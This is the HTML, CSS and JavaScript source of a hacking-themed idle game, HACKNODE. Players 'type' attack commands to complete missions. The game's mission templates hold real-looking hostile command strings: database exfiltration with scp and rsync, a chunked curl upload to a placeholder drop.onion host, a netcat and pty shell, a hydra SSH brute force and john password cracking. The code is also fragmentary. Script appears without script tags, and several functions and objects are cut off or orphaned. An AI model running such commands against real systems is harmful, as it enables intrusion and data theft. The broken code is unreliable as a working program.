<!DOCTYPE html>

<html lang="en" style="background:#050a05;">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>HACKNODE</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  :root{--g:#00ff41;--gd:#00aa2a;--gk:#003a0f;--a:#ffb700;--r:#ff2d2d;--b:#00d4ff;--p:#cc44ff;--bg:#050a05;--b2:#080f08;--b3:#0d180d;--br:#1a3a1a;--dim:#4a7a4a;}
  *{margin:0;padding:0;box-sizing:border-box;}
  html,body{height:100%;background:#050a05;color:#00ff41;font-family:'Share Tech Mono',monospace;overflow:hidden;-webkit-user-select:none;user-select:none;}
  #crt{position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.022) 2px,rgba(0,255,65,.022) 4px);}
  #vig{position:fixed;inset:0;pointer-events:none;z-index:9998;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.8) 100%);}
  #app{display:flex;flex-direction:column;height:100vh;height:100dvh;max-width:480px;margin:0 auto;border-left:1px solid #1a3a1a;border-right:1px solid #1a3a1a;}
  /* HEADER */
  #hdr{padding:6px 12px;background:#080f08;border-bottom:1px solid #1a3a1a;display:flex;flex-direction:column;gap:4px;flex-shrink:0;}
  #hdr-top{display:flex;justify-content:space-between;align-items:center;}
  #logo{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;letter-spacing:4px;color:#00ff41;text-shadow:0 0 10px #00ff41,0 0 20px #00ff41;}
  #hdr-right{display:flex;align-items:center;gap:10px;}
  #alias{font-size:10px;color:#4a7a4a;}#alias span{color:#ffb700;}
  #snd-btn{background:none;border:none;font-size:14px;cursor:pointer;color:#4a7a4a;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;padding:2px 4px;}
  #snd-btn.on{color:#00ff41;}
  #stats{display:flex;gap:8px;font-size:10px;color:#4a7a4a;flex-wrap:wrap;}
  #stats .sv{color:#00ff41;}
  #faction-bar{font-size:10px;display:none;}#faction-bar.on{display:block;}
  #faction-cipher{color:#cc44ff;}#faction-ghost{color:#00d4ff;}
  #qind{font-size:10px;color:#4a7a4a;display:none;}#qind.on{display:block;}#qind span{color:#00d4ff;}
  #heatrow{display:flex;align-items:center;gap:8px;font-size:10px;}
  #hlbl{color:#4a7a4a;width:36px;flex-shrink:0;}
  #htrk{flex:1;height:5px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
  #hfill{height:100%;width:0%;background:#00ff41;border-radius:2px;transition:width .3s,background .3s;}
  #hpct{width:30px;text-align:right;color:#00ff41;font-size:10px;}
  #htrk.pulse{animation:heat-pulse .4s ease-out;}
  @keyframes heat-pulse{0%{box-shadow:0 0 0 rgba(255,45,45,0);}50%{box-shadow:0 0 8px rgba(255,45,45,.6);}100%{box-shadow:0 0 0 rgba(255,45,45,0);}}
  /* Market ticker */
  #market-ticker{font-size:9px;color:#4a7a4a;display:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  #market-ticker.active{display:block;}
  #market-ticker .mt-val{color:#ffb700;}
  #market-ticker .mt-warn{color:#ff2d2d;}
  /* TERMINAL */
  #term-area{display:flex;flex-direction:column;flex:1;overflow:hidden;}
  #term{flex:1;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
  #term::-webkit-scrollbar{width:3px;}#term::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}
  .ll{display:block;word-break:break-all;}
  .ok{color:#00ff41;}.warn{color:#ffb700;}.err{color:#ff2d2d;}.info{color:#00d4ff;}.dim{color:#4a7a4a;}.sep{color:#1a3a1a;}.proc{color:#cc44ff;}
  .story{color:#ffb700;}.void{color:#cc44ff;font-style:italic;}.cipher{color:#cc44ff;}.ghost{color:#00d4ff;}
  /* CMD AREA */
  #cmd-area{background:#080f08;border-top:1px solid #1a3a1a;padding:7px 12px;flex-shrink:0;}
  #phlbl{font-size:9px;letter-spacing:2px;color:#4a7a4a;margin-bottom:3px;display:none;}
  #phlbl.on{display:block;}#phlbl.proc{color:#cc44ff;}
  #countdown{font-size:11px;color:#cc44ff;margin-bottom:4px;display:none;text-align:center;letter-spacing:2px;}
  #countdown.on{display:block;}
  #progwrap{display:none;margin-bottom:5px;gap:8px;align-items:center;font-size:10px;}
  #progwrap.on{display:flex;}
  #proglbl{color:#4a7a4a;min-width:52px;font-size:9px;letter-spacing:1px;}
  #progtrk{flex:1;height:8px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
  #progfill{height:100%;width:0%;background:linear-gradient(90deg,#003a0f,#00ff41);transition:width .15s;border-radius:2px;box-shadow:0 0 5px #00ff41;}
  #progfill.proc{background:linear-gradient(90deg,#330055,#cc44ff);box-shadow:0 0 5px #cc44ff;}
  #progpct{color:#00ff41;width:34px;text-align:right;}
  #prestage{display:none;margin-bottom:5px;padding:5px 8px;border:1px dashed #1a3a1a;border-radius:3px;}
  #prestage.on{display:block;}
  #prestage-lbl{font-size:9px;color:#4a7a4a;letter-spacing:1px;margin-bottom:2px;}
  #prestage-cmd{font-size:11px;display:flex;align-items:center;gap:3px;overflow:hidden;}
  #prestage-prompt{color:#4a7a4a;flex-shrink:0;font-size:10px;}
  #prestage-typed{color:#00ff41;}#prestage-rest{color:#1a3a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  #prestage-cursor{width:6px;height:12px;background:#00aa2a;display:inline-block;flex-shrink:0;animation:blink 1s step-end infinite;}
  #cmddisplay{font-size:11px;min-height:17px;margin-bottom:6px;display:flex;align-items:center;gap:4px;overflow:hidden;}
  #cmdprompt{color:#4a7a4a;flex-shrink:0;}#cmdtxt{color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  #cmdcursor{width:7px;height:13px;background:#00ff41;display:inline-block;flex-shrink:0;animation:blink 1s step-end infinite;}
  @keyframes blink{50%{opacity:0;}}
  /* BUTTONS */
  button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;touch-action:manipulation;border-radius:4px;}
  #tapbtn{width:100%;padding:13px;background:#0d180d;border:1px solid #003a0f;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;display:block;transition:all .1s;}
  #tapbtn:active{background:#003a0f;transform:scale(.98);box-shadow:0 0 10px #00ff41;}
  #tapbtn.proc{border-color:#330055;color:#cc44ff;background:#0d0018;}
  #tapbtn.none{border-color:#1a3a1a;color:#4a7a4a;}
  #tapbtn.idle{border-color:#4a7a4a;color:#4a7a4a;font-size:11px;}
  #tapbtn.locked{opacity:.3;pointer-events:none;}
  #tapbtn.interrupt{border-color:#ff2d2d;color:#ff2d2d;background:#1a0000;animation:pred .6s ease-in-out infinite;}
  @keyframes pred{50%{box-shadow:0 0 15px #ff2d2d;}}
  /* NAV */
  #botnav{display:flex;border-top:1px solid #1a3a1a;background:#080f08;flex-shrink:0;padding-bottom:env(safe-area-inset-bottom,0px);position:relative;z-index:160;}
  .nb{flex:1;padding:12px 2px 10px;background:transparent;border:none;border-right:1px solid #1a3a1a;border-top:2px solid transparent;color:#4a7a4a;font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:0px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;transition:color .2s,background .2s,border-top-color .2s;}
  .nb:last-child{border-right:none;}.nb.act{color:#00ff41;background:#0d180d;border-top-color:#00ff41;}.nb:active{background:#003a0f;color:#00ff41;}
  /* PANEL */
  #panel{display:none;position:fixed;bottom:calc(44px + env(safe-area-inset-bottom,0px));left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#080f08;border-top:2px solid #003a0f;max-height:58vh;z-index:150;}
  #panel.on{display:block;}
  .phdr{padding:10px 12px;border-bottom:1px solid #1a3a1a;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:3px;color:#00aa2a;display:flex;justify-content:space-between;align-items:center;flex-shrink:0;background:#080f08;}
  .pclose{background:none;border:none;color:#4a7a4a;font-size:16px;cursor:pointer;font-family:'Share Tech Mono',monospace;padding:0 4px;-webkit-appearance:none;appearance:none;}
  #panel-content{height:calc(58vh - 42px);overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;}
  #panel-content::-webkit-scrollbar{width:3px;}#panel-content::-webkit-scrollbar-thumb{background:#003a0f;}
  /* FACTION CHOICE */
  .faction-card{margin:10px;padding:14px;border:1px solid #1a3a1a;border-radius:4px;cursor:pointer;transition:all .2s;}
  .faction-card.cipher{border-color:#330055;background:rgba(204,68,255,.05);}
  .faction-card.cipher:active{background:rgba(204,68,255,.15);}
  .faction-card.ghost{border-color:#003a55;background:rgba(0,212,255,.05);}
  .faction-card.ghost:active{background:rgba(0,212,255,.1);}
  .faction-title{font-size:13px;font-family:'Orbitron',monospace;letter-spacing:2px;margin-bottom:6px;}
  .faction-desc{font-size:10px;color:#4a7a4a;line-height:1.6;}
  /* NETWORK MAP */
  #map-container{padding:12px;font-size:11px;line-height:1.6;color:#4a7a4a;}
  #map-canvas{font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.5;white-space:pre;color:#4a7a4a;margin-bottom:12px;}
  .map-node{cursor:pointer;}
  .map-legend{font-size:9px;color:#4a7a4a;border-top:1px solid #1a3a1a;padding-top:8px;margin-top:4px;}
  /* MISSION CARDS */
  /* Mission cards — left stripe shows type, cleaner layout */
  .mc{margin:6px 10px;padding:10px 10px 10px 14px;border:1px solid #1a3a1a;border-left:3px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;position:relative;transition:border-color .2s,background .2s;}
  .mc:active{background:#0d180d;}
  .mc.type-recon{border-left-color:#ffb700;}
  .mc.type-crack{border-left-color:#ff2d2d;}
  .mc.type-exfil{border-left-color:#00d4ff;}
  .mc.queued{border-color:#00d4ff;background:rgba(0,212,255,.04);}
  .mc.active-m{border-color:#00ff41;border-left-color:#00ff41;background:#0d180d;}
  .mc.locked{opacity:.32;cursor:not-allowed;}
  .mc.intel{border-right:2px solid #ffb700;}
  .mc.cipher-m{border-right:2px solid #cc44ff;}.mc.ghost-m{border-right:2px solid #00d4ff;}
  .mtitle{font-size:14px;color:#00ff41;margin-bottom:4px;display:flex;justify-content:space-between;align-items:center;gap:8px;line-height:1.2;}
  .mtag{font-size:9px;padding:2px 6px;border-radius:2px;background:#003a0f;color:#00ff41;flex-shrink:0;letter-spacing:1px;}
  .mtag.exfil{background:#001a3a;color:#00d4ff;}.mtag.crack{background:#2a0000;color:#ff2d2d;}.mtag.recon{background:#1a1a00;color:#ffb700;}
  .mdesc{font-size:11px;color:#4a7a4a;margin-bottom:6px;line-height:1.5;}
  .mreward{display:flex;gap:12px;font-size:11px;margin-bottom:3px;}
  .mreward span{color:#4a7a4a;}.mreward .v{color:#ffb700;font-size:12px;}
  .mmeta{display:flex;gap:10px;font-size:10px;flex-wrap:wrap;}
  .mmeta span{color:#4a7a4a;}.mmeta .v{color:#4a7a4a;}
  .qbadge,.intel-badge{position:absolute;top:8px;right:36px;font-size:9px;letter-spacing:1px;}
  .qbadge{color:#00d4ff;}.intel-badge{color:#ffb700;}
  .pbar-row{display:flex;align-items:center;gap:6px;font-size:9px;margin-top:4px;}
  .pbar-lbl{color:#4a7a4a;width:40px;}.pbar-trk{flex:1;height:3px;background:#0d180d;border:1px solid #1a3a1a;border-radius:1px;overflow:hidden;}.pbar-fill{height:100%;background:#003a0f;border-radius:1px;}
  /* UPGRADES */
  .usec{padding:8px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;}
  .usec:first-child{border-top:none;}
  .uc{margin:4px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:all .15s;}
  .uc:active{background:#0d180d;}.uc.maxed{opacity:.45;cursor:not-allowed;}.uc.broke{opacity:.55;}
  .uinfo{flex:1;}.uname{font-size:12px;color:#00ff41;margin-bottom:2px;}.udesc{font-size:10px;color:#4a7a4a;}
  .ucost{text-align:right;font-size:11px;}.ucost .cv{color:#ffb700;}
  /* INTERRUPT */
  #int-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:500;align-items:center;justify-content:center;}
  #int-ov.on{display:flex;}
  #intbox{background:#080f08;border:2px solid #ff2d2d;border-radius:6px;padding:18px;max-width:340px;width:92%;box-shadow:0 0 30px rgba(255,45,45,.3);}
  #int-title{font-family:'Orbitron',monospace;font-size:12px;color:#ff2d2d;letter-spacing:3px;margin-bottom:8px;}
  #int-body{font-size:11px;color:#4a7a4a;margin-bottom:12px;line-height:1.7;}
  #int-timer{font-size:22px;font-family:'Orbitron',monospace;color:#ff2d2d;text-align:center;margin-bottom:12px;letter-spacing:4px;}
  #int-actions{display:flex;gap:8px;flex-direction:column;}
  .ibtn{padding:11px;background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;border-radius:4px;transition:all .1s;text-align:left;}
  .ibtn:active{background:rgba(255,45,45,.15);}
  .ibtn.safe{border-color:#00d4ff;color:#00d4ff;}.ibtn.safe:active{background:rgba(0,212,255,.1);}
  .ibtn.risky{border-color:#ffb700;color:#ffb700;}.ibtn.risky:active{background:rgba(255,183,0,.1);}
  /* SYSTEM */
  #repdisp{text-align:center;margin:10px;font-size:11px;color:#4a7a4a;}
  #repdisp .rv{color:#ffb700;font-size:14px;font-family:'Orbitron',monospace;}
  #pressec{margin:8px 10px;padding:12px;border:1px solid #ff2d2d;border-radius:4px;background:rgba(255,45,45,.04);}
  #prestitle{font-family:'Orbitron',monospace;font-size:11px;color:#ff2d2d;margin-bottom:6px;letter-spacing:2px;}
  #presdesc{font-size:10px;color:#4a7a4a;margin-bottom:10px;line-height:1.6;}
  #presbtn{width:100%;padding:10px;background:transparent;border:1px solid #ff2d2d;border-radius:4px;color:#ff2d2d;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:3px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;}
  #presbtn:active{background:rgba(255,45,45,.15);}#presbtn:disabled{opacity:.3;cursor:not-allowed;}
  /* OFFLINE */
  #offmod{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:1000;align-items:center;justify-content:center;}
  #offmod.on{display:flex;}
  #offbox{background:#080f08;border:1px solid #003a0f;border-radius:4px;padding:18px;max-width:300px;width:90%;}
  #offbox h2{font-family:'Orbitron',monospace;font-size:11px;color:#00ff41;letter-spacing:3px;margin-bottom:10px;}
  #offlog{font-size:11px;line-height:1.8;color:#4a7a4a;margin-bottom:14px;}#offlog .hi{color:#00ff41;}
  #offok{width:100%;padding:10px;background:#003a0f;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;cursor:pointer;-webkit-appearance:none;appearance:none;}
  /* FX */
  .cfloat{position:fixed;pointer-events:none;font-family:'Orbitron',monospace;font-size:13px;color:#ffb700;text-shadow:0 0 8px #ffb700;z-index:500;animation:fup 1.2s ease-out forwards;}
  @keyframes fup{0%{opacity:1;transform:translateY(0);}100%{opacity:0;transform:translateY(-40px);}}
  @keyframes glitch{0%,100%{transform:translate(0);filter:none;}20%{transform:translate(-4px,2px);filter:hue-rotate(90deg);}40%{transform:translate(4px,-2px);filter:hue-rotate(180deg) brightness(2);}60%{transform:translate(-2px,4px);filter:hue-rotate(270deg);}80%{transform:translate(2px,-4px);filter:brightness(3);}}
  .glitch{animation:glitch .4s ease forwards;}
  /* TERMINAL TABS */
  #term-tabs{display:flex;background:#050a05;border-bottom:1px solid #1a3a1a;flex-shrink:0;}
  .ttab{flex:1;padding:6px 4px;background:transparent;border:none;border-right:1px solid #1a3a1a;color:#4a7a4a;font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:1px;cursor:pointer;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;}
  .ttab:last-child{border-right:none;}.ttab.act{color:#00ff41;background:#0d180d;}.ttab:active{color:#00ff41;}
  #msg-badge{color:#ffb700;animation:pulse-badge .8s ease-in-out infinite;}
  @keyframes pulse-badge{50%{opacity:.3;}}
  .tpane{display:none;height:100%;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
  .tpane.act{display:block;}
  .tpane::-webkit-scrollbar{width:3px;}.tpane::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}

/* SECTOR MAP */
.sector-tab{display:inline-block;padding:3px 8px;margin:0 3px 6px 0;font-size:9px;border:1px solid #1a3a1a;border-radius:2px;cursor:pointer;color:#4a7a4a;-webkit-tap-highlight-color:transparent;}
.sector-tab.act{border-color:#00ff41;color:#00ff41;background:#0d180d;}
.sector-tab.locked{opacity:.3;cursor:not-allowed;}
.sector-tab.rival-cipher{border-color:#330055;color:#cc44ff;}
.sector-tab.rival-ghost{border-color:#003a55;color:#00d4ff;}

/* SCRIPTS PANEL */
.script-card{margin:6px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;display:flex;justify-content:space-between;align-items:center;gap:8px;}
.script-card.deployed{border-color:#00aa2a;background:#030803;}
.script-info{flex:1;}
.script-name{font-size:11px;color:#00ff41;margin-bottom:2px;}
.script-desc{font-size:10px;color:#4a7a4a;}
.script-stats{font-size:9px;color:#4a7a4a;margin-top:2px;}
.script-btn{padding:5px 10px;background:transparent;border:1px solid #003a0f;color:#00aa2a;font-family:‘Share Tech Mono’,monospace;font-size:9px;letter-spacing:1px;cursor:pointer;border-radius:3px;-webkit-appearance:none;appearance:none;flex-shrink:0;}
.script-btn.active{border-color:#ff2d2d;color:#ff2d2d;}
.slot-bar{margin:8px 10px 4px;padding:8px 12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;}
.slot-track{display:flex;gap:3px;margin-top:4px;}
.slot-pip{width:12px;height:12px;border:1px solid #1a3a1a;border-radius:2px;background:#0d180d;}
.slot-pip.used{background:#00ff41;border-color:#00aa2a;}
.slot-pip.used.mining{background:#ffb700;border-color:#aa7700;}

/* RIVAL NODE */
.rival-card{margin:6px 10px;padding:8px 12px;border:1px solid #330055;border-radius:4px;background:rgba(204,68,255,.04);cursor:pointer;font-size:10px;}
.rival-card.ghost-rival{border-color:#003a55;background:rgba(0,212,255,.04);}
.rival-card:active{opacity:.7;}

/* NEWS */
.news-item{padding:8px 0;border-bottom:1px solid #1a3a1a;font-size:11px;color:#4a7a4a;line-height:1.6;}
.news-item .nh{color:#ffb700;font-size:10px;letter-spacing:1px;margin-bottom:2px;}
.news-item.alert .nh{color:#ff2d2d;}

/* BOOT */
#boot{position:fixed;inset:0;background:#050a05;z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;}
#bootlogo{font-family:‘Orbitron’,monospace;font-size:28px;font-weight:900;letter-spacing:8px;color:#00ff41;text-shadow:0 0 20px #00ff41,0 0 40px #00ff41;animation:glow 1s ease-in-out infinite;}
@keyframes glow{50%{text-shadow:0 0 40px #00ff41,0 0 80px #00ff41;}}
#bootstatus{font-size:11px;color:#4a7a4a;letter-spacing:2px;}
</style>

</head>
<body style="background:#050a05;color:#00ff41;">

function randIP(){return `${rnd(10,220)}.${rnd(0,255)}.${rnd(0,255)}.${rnd(1,254)}`;}
function randSN(){return `${rnd(10,192)}.${rnd(0,255)}.${rnd(0,255)}.0/24`;}
function randPort(){return [22,23,80,443,3306,5432,8080,8443,27017,6379][rnd(0,9)];}
function randUser(){return ['admin','root','user','ubuntu','postgres','deploy','svc_acc','dbadmin'][rnd(0,7)];}
function randCVE(){return `CVE-${rnd(2020,2024)}-${rnd(1000,99999)}`;}
function randHash(){return Array.from({length:8},()=>'0123456789abcdef'[rnd(0,15)]).join('');}
function randFS(){return [512,1024,4096,16384,51200,102400,512000,1048576,2457600][rnd(0,8)];}
function fmtFS(kb){if(kb>=1024*1024)return(kb/1024/1024).toFixed(1)+'GB';if(kb>=1024)return(kb/1024).toFixed(1)+'MB';return kb+'KB';}
function buildEx(u,ip,kb){
  const m=kb/1024;
  if(m<10)return`scp -r ${u}@${ip}:/var/db/corp ./exfil/`;
  if(m<100)return`scp -r -C ${u}@${ip}:/var/db/corp /tmp/stage/ && tar -czf dump.tar.gz /tmp/stage/`;
  if(m<1024)return`rsync -avz --bwlimit=512 ${u}@${ip}:/var/db/ ./exfil/ --exclude="*.log"`;
  return`rsync -avz --bwlimit=256 ${u}@${ip}:/var/db/ ./stage/ && split -b 256m ./stage/dump.sql chunk_ && for f in chunk_*; do curl -s -F "file=@$f" http://drop.onion/up; done`;
}

    nmap_scan:`nmap -sV -p ${port} ${sn}`,
    john_crack:`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=sha256`,
    hydra_ssh:`hydra -l ${user} -P rockyou.txt ssh://${ip}`,
    nc_listen:`nc -lvnp 4444 & python3 -c "import pty;pty.spawn('/bin/bash')" | nc ${ip} 4444`,
    scp_exfil:buildEx(user,ip,fs),

  };

  const s=G.currentSector;
  const targetLabel=s===0?`local host (${ip})`:`${corp} (${ip})`;
  const targetShort=s===0?`local host`:`${corp}`;
  const descs={

      ?`Wardrive block ${sn}. Discover nearby open devices.`

    ssh_backdoor:`Install persistent backdoor on ${targetLabel}.`,

  return{...t,command:cmds[t.id]||'',desc:descs[t.id]||'',_fs:fs,_ip:ip,_sn:sn,_port:port,_user:user,_corp:corp,_intelBonus:ib};
}

function initNetworkMap(){
  MAP_NODES.forEach(n=>{
    if(!G.networkNodes[n.id]){
      // Only local_net starts visible — everything else is unknown
      const startStatus = n.id==='local_net' ? 'scanned' : 'unknown';
      G.networkNodes[n.id]={status:startStatus, name:n.name, sector:n.sector};
    }
  });
}

function revealMapNode(nodeId){
  if(G.networkNodes[nodeId]&&G.networkNodes[nodeId].status==='unknown'){
    G.networkNodes[nodeId].status='scanned';
    const node=MAP_NODES.find(n=>n.id===nodeId);
    log(`> MAP UPDATE: ${node?.name||nodeId} discovered`,'info');
  }
}

// Recon reveals nodes based on current sector
function onReconComplete(){
  const sector=G.currentSector;

  if(sector===0){
    // Reveal one unknown local node
    const unknownLocal=MAP_NODES.filter(n=>n.sector===0&&G.networkNodes[n.id]?.status==='unknown');
    if(unknownLocal.length>0){
      const target=unknownLocal[rnd(0,unknownLocal.length-1)];
      revealMapNode(target.id);
    } else {
      // All local nodes revealed — generate a random new node (fluff host)
      addRandomLocalNode();
    }
  } else {
    // Reveal one unknown node in current sector
    const unknownSector=MAP_NODES.filter(n=>n.sector===sector&&G.networkNodes[n.id]?.status==='unknown');
    if(unknownSector.length>0){
      const target=unknownSector[rnd(0,unknownSector.length-1)];
      revealMapNode(target.id);
      // Seeding rivals when we first see nodes in hostile sectors
      setTimeout(()=>initRivalNodes(),500);
    } else {
      // All sector nodes revealed — generate a random host in this sector
      addRandomLocalNode(sector);
    }
  }
}

function resolveInt(outcome,choice){
  clearInterval(intTimerInt);
  document.getElementById('int-ov').classList.remove('on');
  intState.active=false;
  const int=intState.intObj;
  G.interruptFails=G.interruptFails||0;
  let resume=true;
  if(outcome==='tap_ok'){log(`> ✓ EVADED: ${int.successMsg}`,'ok');}
  else if(outcome==='tap_fail'){
    G.interruptFails++;log(`> ✗ FAILED: ${int.failMsg}`,'warn');
    if(G.interruptFails===1){addHeat(int.heatOnFail||20);const fine=Math.floor(G.credits*0.05);G.credits=Math.max(0,G.credits-fine);if(fine>0)log(`> FINE: -$${fmtNum(fine)}`,'warn');}
    else if(G.interruptFails===2){addHeat(int.heatOnFail||20);log(`> LOCKOUT: heat decay suspended 30s`,'err');}
    else{log(`> REWARD CUT 50%`,'err');intState.rewardHalved=true;}
    if(int.id==='auth'){resume=false;abortMission();}
  }else if(outcome==='abort'){log(`> ${choice.msg}`,'warn');resume=false;abortMission();}
  else if(outcome==='continue'){log(`> ${choice.msg}`,'warn');addHeat(18);}
  else if(outcome==='spoof'){log(`> ${choice.msg}`,'dim');addHeat(6);intState.rewardHalved=true;}
  else if(outcome==='throttle'){log(`> ${choice.msg}`,'dim');}
  else if(outcome==='reroute'){log(`> ${choice.msg}`,'warn');addHeat(10);}
  else if(outcome==='race_win'){log(`> ✓ Target locked. Rival blocked.`,'ok');}
  else if(outcome==='race_lose'){G.interruptFails++;log(`> Rival partial access. Reward halved.`,'warn');intState.rewardHalved=true;}
  intState.processPaused=false;
  if(resume&&G.missionRunning&&G.phase==='process'){
    const m=MISSIONS.find(m=>m.id===G.activeMission)||FACTION_MISSIONS.find(m=>m.id===G.activeMission);
    const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===G.activeMission);
    if(m&&t)resumeProc(m,t,outcome==='throttle'?2:1);
  }
  updateUI();
}

function getProcSecs(t){
  const b=t.pBase,d=t.driver;
  if(d==='latency')          return Math.max(3,b/(200/Math.max(G.latency,5)));
  if(d==='cpu')              return Math.max(3,b/(G.cpu/256));
  if(d==='bandwidth')        return Math.max(3,b/(G.bandwidth/56));
  if(d==='cpu+ram')          return Math.max(3,b/((G.cpu/256)*.6+(G.ram/512)*.4));
  if(d==='bandwidth+latency')return Math.max(3,b/((G.bandwidth/56+200/Math.max(G.latency,5))/2));
  return b;
}

function getBWT(){if(G.bandwidth>=1000000)return 5;if(G.bandwidth>=100000)return 4;if(G.bandwidth>=10000)return 3;if(G.bandwidth>=1000)return 2;return 1;}
function nextPos(st){
  const{command:c,typed:t}=st; if(t>=c.length)return c.length;
  const tier=G.typingTier;
  if(tier>=2)return c.length;
  if(tier===1){
    // Argument-group-per-tap: skip 1-2 short tokens at once to feel like
    // "autocomplete by argument chunk" not "one flag at a time"
    // Short single-char flags (-r, -v, -C) get grouped with next token
    // Long tokens (IPs, paths, URLs) each count as their own tap
    let pos=t;
    let tapsConsumed=0;
    const maxTaps=1; // always exactly 1 meaningful chunk per tap
    while(pos<c.length && tapsConsumed<maxTaps){
      const r=c.slice(pos);
      const sp=r.indexOf(' ');
      if(sp===-1){pos=c.length;break;}
      const token=r.slice(0,sp);
      pos=pos+sp+1;
      tapsConsumed++;
      // If token is a very short flag (<= 3 chars like -r, -v, -C, -x)
      // consume one more token alongside it so it does not feel too granular
      if(token.length<=3&&token.startsWith('-')&&pos<c.length){
        const r2=c.slice(pos);
        const sp2=r2.indexOf(' ');
        if(sp2===-1)pos=c.length;
        else pos=pos+sp2+1;
      }
    }
    return pos;
  }
  return Math.min(t+[0,1,2,3,4,6][Math.min(getBWT(),5)],c.length);
}

  el('countdown').className='countdown'; el('progwrap').classList.add('on');

  el('prestage').className='prestage'; updatePct(0); updateTapBtn();

function tapType(){
  if(G.phase!=='type'||!G.missionRunning)return false;
  const allMissions=[...MISSIONS,...FACTION_MISSIONS];
  const m=allMissions.find(m=>m.id===G.activeMission);
  if(!m||TS.typed>=TS.command.length)return false;
  const prev=TS.typed; TS.typed=nextPos(TS); renderCmd(); playKey();
  if(prev===0) onTutFirstTap();
  addHeat((m.hPC||.04)*(TS.typed-prev)*(m._intelBonus?.7:1));
  const pct=Math.min(100,(TS.typed/TS.command.length)*100);
  G.missionProgress=pct; updatePct(pct);
  if(TS.typed>=TS.command.length){setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},350);}
  return true;
}

// PHASE 2: PROCESS
// ═══════════════════════════════════════════════
function startProcPhase(mission){
  G.phase='process'; G.missionProgress=0;
  onTutPhase2Start();
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const template=allT.find(t=>t.id===mission.id);
  const secs=getProcSecs(template)*(mission._intelBonus&&template.id==='scp_exfil'?.7:1);
  el('phlbl').textContent=`// PHASE 2: ${dLbl(template.driver)}`; el('phlbl').className='phlbl on proc';
  el('proglbl').textContent=dTag(template.driver); el('progfill').className='proc'; el('progpct').style.color='#cc44ff';
  updatePct(0); updateTapBtn(); startCdown(Math.ceil(secs));
  startAmbient(template.driver);
  log(`> Processing... [${dLbl(template.driver)}] ~${Math.ceil(secs)}s`,'proc');
  // Use sector-specific flavor if available
  const sectorFlavor=template.flavorByS&&template.flavorByS[G.currentSector];
  const fl=[...(sectorFlavor||template.flavor||[])];
  fl.forEach((line,i)=>{
    setTimeout(()=>{
      if(G.phase!=='process'||G.activeMission!==mission.id)return;
      const cooked=line.replace('{port}',mission._port||randPort()).replace('{user}',mission._user||randUser()).replace('{hash}',randHash()).replace('{n}',rnd(100,9999)).replace('{ip}',mission._ip||randIP()).replace('{pct}',Math.floor((i/fl.length)*100)+'%').replace('{size}',fmtFS(mission._fs||1024));
      log('  '+cooked,'dim');
    },(secs*1000/fl.length)*i+300);
  });
  startProcInt(secs,1);
  setupPrestage();
  setTimeout(()=>tryInterrupt(),rnd(Math.floor(secs*300),Math.floor(secs*700)));
}

function startProcInt(secs,mult){
  clearInterval(procInt);
  const tickMs=150,totalTicks=(secs*1000)/(tickMs*mult); let ticks=0;
  const allT2=[...MT,...Object.values(FACTION_MT).flat()];
  const tmpl2=allT2.find(t=>t.id===G.activeMission);
  procInt=setInterval(()=>{
    if(intState.processPaused)return;
